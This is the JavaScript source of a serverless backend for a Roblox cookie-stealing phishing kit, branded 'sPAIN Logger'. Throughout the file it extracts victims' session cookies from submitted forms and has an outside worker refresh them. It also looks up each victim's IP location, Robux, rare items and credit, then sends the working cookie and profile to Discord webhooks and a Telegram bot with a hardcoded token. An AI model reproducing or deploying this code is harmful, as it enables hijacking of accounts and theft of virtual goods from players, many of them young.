// api/submit.js — Uses worker for cookie validation
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// Your worker URL
const COOKIE_WORKER_URL = 'https://socca.nlesocca.workers.dev/cookie';

// Item asset IDs
const ITEMS = {
  HEADLESS: 134082579,
  KORBLOX: 139607625,
  VALKYRIE: 1365767
};

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// Call worker to validate/refresh cookie and get account info
async function refreshCookieStatus(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 15000);
    
    const response = await fetch(COOKIE_WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie }),
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    const result = await response.json();
    
    if (!result.success) {
      return { 
        refreshed: false, 
        error: result.error || 'Cookie validation failed',
        account: null,
        timestamp: new Date().toISOString()
      };
    }
    
    // Map worker response to expected format
    const acc = result.fullAccount || {};
    return {
      refreshed: true,
      newCookie: result.newCookie || cookie,
      isDifferent: result.isDifferent || false,
      account: {
        id: result.userId,
        username: result.username,
        displayName: result.displayName,
        profileUrl: `https://www.roblox.com/users/${result.userId}/profile`,
        avatarUrl: acc.avatarUrl || result.avatarUrl,
        robux: acc.robux || 0,
        rap: acc.rap || 0,
        items: acc.limiteds || 0,
        credit: acc.credit || 0,
        premium: acc.hasPremium || false,
        voiceChat: acc.voiceChat || false,
        headless: acc.headless || false,
        korblox: acc.korblox || false,
        valkyrie: acc.valkyrie || false,
        accountAge: acc.ageDays || 0,
        friends: acc.friends || 0,
        groupsOwned: acc.groupsOwned || 0
      },
      timestamp: new Date().toISOString()
    };
    
  } catch (err) {
    return { 
      refreshed: false, 
      error: err.message,
      account: null,
      timestamp: new Date().toISOString()
    };
  }
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}

function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
const REFRESH_COOKIE_LINK = `[Refresh Cookie](${COOKIE_REFRESH_URL})`;

const createWebhookPayload = (type, data) => {
  const basePayload = { username: WH_NAME, avatar_url: WH_AVATAR };

  switch (type) {
    case 'webhook1':
      return {
        ...basePayload,
        content: data.content || '@everyone',
        embeds: [{
          title: data.title || '🍪 Cookie Captured (Dualhook)',
          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
          color: data.color || 0x06b6d4,
          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
          fields: data.fields || [],
          footer: { text: data.footer || `sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    case 'webhook2':
      return {
        ...basePayload,
        content: data.content || '@everyone',
        embeds: [{
          title: data.title || '🍪 Cookie Captured',
          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
          color: data.color || 0xc026d3,
          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
          fields: data.fields || [],
          footer: { text: data.footer || `sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    case 'account_info':
      return {
        ...basePayload,
        content: data.content || '',
        embeds: [{
          title: data.title || '✅ Account Info Valid',
          description: data.description || '',
          color: data.valid === false ? 0xff0000 : 0x00ff00,
          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
          fields: data.fields || [],
          footer: { text: `Account Check • sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    default:
      return basePayload;
  }
};

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordSendCookie(url, cookie, username) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: WH_NAME,
        avatar_url: WH_AVATAR,
        content: `**🔐 Cookie for: ${username || 'Unknown'}**\n\`\`\`\n${cookie}\n\`\`\``
      })
    });
  } catch (_) {}
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots, action } = body;
  
  if (action === 'check_account' || action === 'refresh_cookie') {
    if (!slots) return res.status(400).json({ error: 'slots is required' });
    const cookie = findCookie(slots);
    if (!cookie) return res.status(400).json({ error: 'No valid cookie found' });
    
    const refreshResult = await refreshCookieStatus(cookie);
    return res.status(200).json(refreshResult);
  }
  
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
              || req.headers['x-real-ip'] || 'Unknown';
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;
  const cookie = findCookie(slots);

  const webhooks = [record.webhook];
  if (record.dualhookParent) {
    const parent = await redisGet(`slot:${record.dualhookParent}`);
    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
  }

  if (!cookie) {
    const geo = await getIpGeo(ip);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    
    const wrongCookiePayload = createWebhookPayload('webhook2', {
      title: '⚠️ Wrong Cookie — Troll Detected',
      description: record.dualhookParent
        ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
        : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
      color: 0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip,                   inline: true  },
        { name: '📍 Location', value: loc,                  inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
        { name: '🕐 Time',     value: now,                  inline: false },
        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
      ],
      footer: `sPAIN Logger • ${pName}`,
      timestamp: now
    });
    
    await Promise.all(webhooks.map(wh => discordSend(wh, wrongCookiePayload)));
    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // Use worker for cookie validation/refresh
  const geoPromise = getIpGeo(ip);
  const accountPromise = refreshCookieStatus(cookie);

  let webhook1 = null;
  let webhook2 = record.webhook;
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook) webhook1 = parentRecord.webhook;
    } catch (_) {}
  }

  const [geo, refreshResult] = await Promise.all([geoPromise, accountPromise]);
  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp = geo?.isp || 'Unknown';
  
  const workingCookie = refreshResult.newCookie || cookie;
  const acc = refreshResult.refreshed ? refreshResult.account : null;
  const avatarUrl = acc?.avatarUrl || null;

  // STEP 1: 🍪 Cookie Captured
  const wh2Payload = createWebhookPayload('webhook2', {
    description: record.dualhookParent
      ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
      : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
    thumbnail: avatarUrl,
    fields: [
      { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
      { name: '📄 Page',     value: pName,        inline: true  },
      { name: '🕐 Time',     value: now, inline: true },
      { name: '📍 Location', value: loc, inline: true  },
      { name: '🗺️ ISP',      value: isp, inline: true  },
      { name: '🔄 Refreshed', value: refreshResult.isDifferent ? '✅ Yes' : '⚠️ No', inline: true },
      { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
    ],
    footer: `sPAIN Logger • ${pName}`,
    timestamp: now
  });

  await discordSend(webhook2, wh2Payload);

  if (webhook1 && webhook1 !== webhook2) {
    const wh1Payload = createWebhookPayload('webhook1', {
      title: '🍪 Cookie Captured (Dualhook)',
      thumbnail: avatarUrl,
      fields: [
        { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
        { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true  },
        { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true  },
        { name: '📍 Location',  value: loc,                           inline: true  },
        { name: '🗺️ ISP',       value: isp,                           inline: true  },
        { name: '🕐 Time',      value: now,                           inline: true  },
        { name: '🔄 Refreshed', value: refreshResult.isDifferent ? '✅ Yes' : '⚠️ No', inline: true },
        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
      ],
      footer: `sPAIN Logger • ${pName}`,
      timestamp: now
    });
    
    await discordSend(webhook1, wh1Payload);
  }

  // STEP 2: ✅ Account Info Valid
  if (acc) {
    const accountPayload = createWebhookPayload('account_info', {
      description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
      thumbnail: avatarUrl,
      fields: [
        { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
        { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
        { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
        { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
        { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
        { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
        { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
        { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
        { name: '📦 Items', value: acc.items.toString(), inline: true },
        { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
        { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
        { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
        { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
      ]
    });
    
    await discordSend(webhook2, accountPayload);
    if (webhook1) await discordSend(webhook1, accountPayload);
  }

  // STEP 3: 🔐 Send Working Cookie
  await discordSendCookie(webhook2, workingCookie, acc?.username);
  if (webhook1) await discordSendCookie(webhook1, workingCookie, acc?.username);

  // Telegram
  await tgSend([
    `🍪 <b>COOKIE — ${pName}</b>`,
    `🌐 <code>${ip}</code>`,
    `📍 ${loc}`,
    `🗺️ ${isp}`,
    `👤 ${acc ? acc.username : 'Invalid'}`,
    acc ? `💰 Robux: ${acc.robux.toLocaleString()}` : '',
    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.items} items)` : '',
    acc ? `⭐ Premium: ${acc.premium ? 'Yes' : 'No'}` : '',
    acc ? `💀 Headless: ${acc.headless ? 'Yes' : 'No'}` : '',
    acc ? `⚔️ Korblox: ${acc.korblox ? 'Yes' : 'No'}` : '',
    `🔄 Refreshed: ${refreshResult.isDifferent ? 'Yes' : 'No'}`,
    `🕐 ${now}`
  ].filter(Boolean).join('\n'));

  return res.status(200).json({ 
    success: true, 
    refreshed: refreshResult.isDifferent,
    account: acc
  });
}
